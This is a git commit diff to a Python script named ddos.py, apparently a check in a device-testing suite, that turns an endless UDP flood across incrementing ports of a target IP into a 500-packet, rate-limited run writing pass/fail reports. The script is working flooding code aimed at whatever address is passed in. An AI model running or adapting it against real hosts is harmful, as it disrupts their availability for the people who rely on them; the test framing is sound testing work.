eb9fdf2251197a04a8eb3b91f85687a6262a656f
InBrewJ <jason.brewer@arupiot.com>
2020-01-31 17:24:51 +0000

    test_needless is failing, need to go back to basics

--- subset/needless/ddos.py
+++ subset/needless/ddos.py
@@ -4,12 +4,21 @@
 import socket
 import random
 import argparse
+from time import sleep
+
+REPORT_OUT = '/tmp/local.report.txt'
 
 # Options to control the flow of things
 parser = argparse.ArgumentParser()
-parser.add_argument("--port", "-p", help="Starting port to attack")
-parser.add_argument("--address", "-a", help="IP address to attack")
+parser.add_argument("--port", "-p", help="Starting port to DDoS attack")
+parser.add_argument("--address", "-a", help="IP address to DDoS attack")
+parser.add_argument("--skip", "-s", help="Skip the test for no apparent reasons", action="store_true")
 args = parser.parse_args()
+
+if args.skip:
+    with open(REPORT_OUT, 'w') as f:
+        f.write("RESULT info needless.script.kiddie Someone skipped the test!")
+    exit()
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -20,10 +29,29 @@ ip = args.address
 port = int(args.port)
 
 sent = 0
-while True:
-    sock.sendto(bytes, (ip,port))
-    sent = sent + 1
-    port = port + 1
-    print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
-    if port == 65534:
-        port = 1
+
+timer = 500
+
+while timer > 0:
+    try:
+        sock.sendto(bytes, (ip,port))
+        sent = sent + 1
+        port = port + 1
+        print("Sent %s packet to %s throught port:%s" % (sent, ip, port))
+        if port == 65534:
+            port = 1
+
+        sleep(0.01)
+        timer -= 1
+
+    except Exception as e:
+        print("Could not DDoS, test failed!")
+        print("Why: ", e)
+        with open(REPORT_OUT, 'w') as f:
+            print("failed! writing report...")
+            f.write("RESULT fail needless.script.kiddie Could not DDoS because reasons")
+        exit()
+
+with open(REPORT_OUT, 'w') as f:
+    print("PASSED writing report...")
+    f.write("RESULT pass needless.script.kiddie The server is now down. hooray")
